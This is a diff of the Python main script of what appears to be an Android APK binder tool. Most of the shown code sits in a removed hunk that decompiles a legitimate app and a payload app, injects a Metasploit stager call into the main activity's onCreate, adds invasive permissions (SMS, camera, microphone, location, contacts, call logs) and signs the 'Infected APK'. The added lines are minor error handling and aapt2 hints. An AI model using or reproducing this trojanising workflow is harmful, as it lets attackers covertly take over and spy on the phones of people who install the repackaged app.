@@ -1,272 +1,4 @@
-import os,sys,subprocess,socket
-import shutil,urllib.request
-from xml.dom.minidom import parseString
-from time import sleep
-
-
-YELLOW = '\033[33m'
-BLUE = '\033[34m'
-CYAN = '\033[36m'
-GREEN = '\033[32;1m'
-RED = '\033[31;1m'
-WHITE = '\033[m'
-
-
-cp = ''
-mv = ''
-rm = ''
-
-if os.name == 'nt':
-	cp = 'xcopy /q /y'
-	mv = 'move '
-	rm = 'rmdir /S /Q'
-else:
-	cp = 'cp -r'
-	mv = 'mv'
-	rm = 'rm -rf'
-
-global package, package_name, package_name_path, smali_loc, smali_path,P1
-
-
-payload_input = 'Not set'
-original_input = 'Not set'
-final_path = 'Not set'
-aapt2=False
-interactive=False
-
-def Termux_Bool():
-	try:
-		if 'termux' in os.environ['HOME']:
-			return True
-		else:
-			return False
-	except KeyError:
-		return False
-
-def err_msg(msg):
-    print(RED + "[!] " + msg + WHITE)
-
-def print_status(msg):
-    print(CYAN + "[+] " + msg + WHITE)
-
-def isOnline():
-    try:
-        # connect to the host
-        socket.create_connection(("www.google.com", 80))
-        return True
-    except OSError:
-        pass
-    return False
-
-def Update():
-		print_status(YELLOW + 'Checking for updates...')
-		oo = open('.ver','r').read()
-		u=urllib.request.urlopen('https://raw.githubusercontent.com/R37r0-Gh057/Linder/master/.ver').read().decode('utf-8')
-		if oo.split('\n')[0] == u.split('\n')[0]:
-			print_status(YELLOW + 'No updates available')
-		else:
-			print_status(GREEN + "Update available. Updating...(DONT CLOSE!) ")
-			files_to_update=['main.py','README.md','CONTRIBUTORS.md','termux-setup.sh','CHANGELOG.MD','.ver']
-			for fn in files_to_update:
-				try:
-					u=urllib.request.urlopen('https://github.com/R37r0-Gh057/Linder/raw/master/'+fn).read().decode('utf-8')
-				except:
-					err_msg("Error While Fetching Updates...")
-					print_status(YELLOW+"Reverting Changes...")
-					for dlf in files_to_update:
-						os.remove(dlf+'.tmp')
-					print_status("Exiting....")
-					exit()
-				f=open(fn+'.tmp','w')
-				f.write(u)
-				f.close()
-			for fn in files_to_update:
-				os.rename(fn+'.tmp',fn)
-			print_status(GREEN + "Update Finished....")
-			print_status(BLUE + "Please Restart The Script...")
-			exit()
-def Usage():
-	if Termux_Bool():
-		print(YELLOW + 'python3 %s <payload.apk> <target.apk> <output.apk> <extra arg>\n' % (str(sys.argv[0])))
-		print('Extra args:- ' + YELLOW + "--use-aapt2" + WHITE)
-		exit()
-	print(YELLOW + 'python3 %s <payload.apk> <target.apk> <output.apk>\n' % (str(sys.argv[0])))
-	print('\n' + YELLOW + 'pass the ' + BLUE + "--update" + YELLOW + " parameter to update.\n" + WHITE)
-	exit()
-
-# Getting payload apk name
-
-def PN():
-	if '/' in payload_input:
-		tmp = payload_input.split('/')
-		name = tmp[len(tmp) - 1]
-		return str(name)
-	else:
-		return payload_input
-
-# Getting original apk name
-
-def ON():
-	if '/' in original_input:
-		tmp = original_input.split('/')
-		name = tmp[len(tmp) - 1]
-		return name
-	else:
-		return original_input
-
-
-
-# Finding main activity smali
-
-def findA(xml):
-	Android = ''
-	with open(xml,'r') as f:
-		dom = parseString(f.read())
-		activities = dom.getElementsByTagName('activity')
-		for activity in activities:
-			intents = activity.getElementsByTagName('intent-filter')
-			for intent in intents:
-				actions = intent.getElementsByTagName('action')
-				for action in actions:
-					if action.getAttribute('android:name') == 'android.intent.action.MAIN':
-						Android += activity.getAttribute('android:name') + '\n'
-						break
-	return Android.split('\n')[0]
-
-# If couldnt find path of activity, then joining the package name and activity name to get the activity path
-
-def SetA(A):
-	if len(A.split('.')) == 1:
-		A = P1+'.'+A		# P1 variable stores the package name
-	elif len(A.split('.')) == 2:
-		A= P1+A
-	return A
-
-# Finding package name
-def findP(xml):
-	fi = open(xml,'r')
-	f=fi.readline()+fi.readline()
-	pos1=f.find("package=")+9
-	pos2=f.find('"',pos1+1)
-	if pos1==8:
-		return ''
-	else:
-		return f[pos1:pos2]
-
-# Self Explanatory:
-
-def SetP(P):
-	global package,P1
-	if '"' in P:
-		P = P.replace('"','')
-	if '>' in P:
-		P = P.replace('>','')
-	if '<' in P:
-		P = P.replace('<','')
-	P1 = P
-	package = P.replace('.', '/')
-	return package, P
-
-
-# Finding hook point in the main activity smali
-def find(smali,par):
-	count = 0
-	SmaliCon = ''
-	TargetStr = ''
-
-	with open(smali,'r') as f:
-		SmaliCon = f.read()
-		for i in SmaliCon.split('\n'):
-			if 'invoke-super' in i and 'onCreate(Landroid/os/Bundle;)V' in i:
-					TargetStr = i
-					break
-			else:
-				count += 1
-	if TargetStr != '':
-		print ("Hook point can be injected after line %d" % (count + 1))
-		return SmaliCon, TargetStr, count
-
-# Injecting hook in smali
-
-def newsmali(contents,targetstring):
-	with open('newsmali','w') as f:
-		for i in contents.split('\n'):
-			if i == targetstring:
-				f.write('\n')
-				f.write(i)
-				f.write('\n')
-				f.write('    invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V')
-			else:
-				f.write('\n')
-				f.write(i)
-
-
-# The main event
-
-def Bind():
-	try:
-		global out
-		Perms_List = ['<uses-permission android:name="android.permission.INTERNET"/>',
-                        '<uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>',
-                        '<uses-permission android:name="android.permission.CHANGE_WIFI_STATE"/>',
-                        '<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>',
-                        '<uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>',
-                        '<uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>',
-                        '<uses-permission android:name="android.permission.READ_PHONE_STATE"/>',
-                        '<uses-permission android:name="android.permission.SEND_SMS"/>',
-                        '<uses-permission android:name="android.permission.RECEIVE_SMS"/>',
-                        '<uses-permission android:name="android.permission.RECORD_AUDIO"/>',
-                        '<uses-permission android:name="android.permission.CALL_PHONE"/>',
-                        '<uses-permission android:name="android.permission.READ_CONTACTS"/>',
-                        '<uses-permission android:name="android.permission.WRITE_CONTACTS"/>',
-                        '<uses-permission android:name="android.permission.RECORD_AUDIO"/>',
-                        '<uses-permission android:name="android.permission.WRITE_SETTINGS"/>',
-                        '<uses-permission android:name="android.permission.CAMERA"/>',
-                        '<uses-permission android:name="android.permission.READ_SMS"/>',
-                        '<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>',
-                        '<uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>',
-                        '<uses-permission android:name="android.permission.SET_WALLPAPER"/>',
-                        '<uses-permission android:name="android.permission.READ_CALL_LOG"/>',
-                        '<uses-permission android:name="android.permission.WRITE_CALL_LOG"/>',
-                        '<uses-permission android:name="android.permission.WAKE_LOCK"/>']
-
-		Feature_List = ['<uses-feature android:name="android.hardware.camera"/>',
-                        '<uses-feature android:name="android.hardware.camera.autofocus"/>',
-                        '<uses-feature android:name="android.hardware.microphone"/>']
-
-
-		payload = PN()
-		original = ON()
-
-	# STEP 1.
-		
-		try:
-			if os.path.isdir("TempP"):
-				print_status("Cleaning Temporary Files...")
-				subprocess.call(rm + " TempP",shell=True)
-				if not os.path.isdir("TempP"):
-					os.mkdir("TempP")
-				print_status("done.")
-			else:
-				os.mkdir("TempP")
-		except:
-			pass
-		print_status("Copying APKs...")
-		subprocess.call(cp + ' ' +  payload_input + " TempP", shell=True)
-		subprocess.call(cp + ' ' + original_input + " TempP", shell=True)
-
-		print_status("done.")
-
-	# STEP 2.
-
-		print_status("Decompiling APKs...\n")
-		os.chdir("TempP/")
-		if Termux_Bool():
-			os.system('apkmod -d %s -o %s' % (original,original.replace('.apk','')))
-			os.system('apkmod -d %s -o %s' % (payload,payload.replace('.apk','')))
-		else:
-			os.system('apktool d -f %s' % (original))
-			os.system('apktool d -f %s' % (payload))
+.system('apktool d -f %s' % (payload))
 
 		print_status("\ndone.")
 	# STEP 3.
@@ -347,15 +79,24 @@ def Bind():
 
 		if Termux_Bool():
 			if aapt2:
-				subprocess.call("apkmod -a -r %s -o fin_out.apk" % (original.replace('.apk','')),shell=True)
+				subprocess.call("apkmod -a -r %s -o fin_out.apk > /dev/null 2>&1" % (original.replace('.apk','')),shell=True)
 				os.chdir('../')
 			else:
-				subprocess.call("apkmod -r %s -o fin_out.apk" % (original.replace('.apk','')),shell=True)
+				subprocess.call("apkmod -r %s -o fin_out.apk > /dev/null 2>&1" % (original.replace('.apk','')),shell=True)
 				os.chdir('../')
 		else:
 			subprocess.call("apktool b %s -o %s -f" % (original.replace('.apk',''),str(final_path)),shell=True)
 			subprocess.call(mv + ' '+ str(final_path) + ' ..',shell=True)
 			os.chdir('../')
+		if os.path.exists('fin_out.apk'):
+			pass
+		else:
+			if Termux_Bool():
+				err_msg('Cannot recompile')
+				print(RED + '[!]'+ CYAN + ' Please enable the use of aapt2. Type ' + YELLOW + 'set aapt2 true' + CYAN + ' in interface mode or pass ' + YELLOW + '--use-aapt2' + CYAN + ' arguement in the end' + WHITE)
+				exit()
+			else:
+				exit()
 		print_status('Signing Infected APK...\n')
 		if Termux_Bool():
 			subprocess.call("apkmod -s TempP/fin_out.apk -o %s" % (str(final_path)),shell=True)
@@ -456,6 +197,8 @@ class Interactive:
 		print('[+] update 		update the script\n')
 		print('[+] help  		show this help message\n')
 		print('[+] exit 		does what it says.\n')
+		if Termux_Bool():
+			print(BLUE + '[+] '+ CYAN + 'It is recommended to enable the use of '+YELLOW+'aapt2 '+ CYAN + 'to avoid errors during recompilation. But if you still get error then retry with ' + YELLOW + 'aapt2' + CYAN + ' disabled.\n To enable '+YELLOW + 'aapt2' + CYAN+ ' type this:- ' + RED + 'set aapt2 true' + CYAN + '\n To use it in cli, just pass '+RED+'--use-aapt2'+ CYAN +' arguement in the end.' + WHITE)
 
 	def clear(self):
 		if os.name == 'nt':
@@ -549,8 +292,8 @@ def argscheck():
 			exit()
 	elif len(sys.argv) == 5 and Termux_Bool():
 		if str(sys.argv[4]) == '--use-aapt2':
+			print_status('using aapt2')
 			aapt2 = True
-			print_status('Using aapt2')
 		else:
 			Usage()
 			exit()
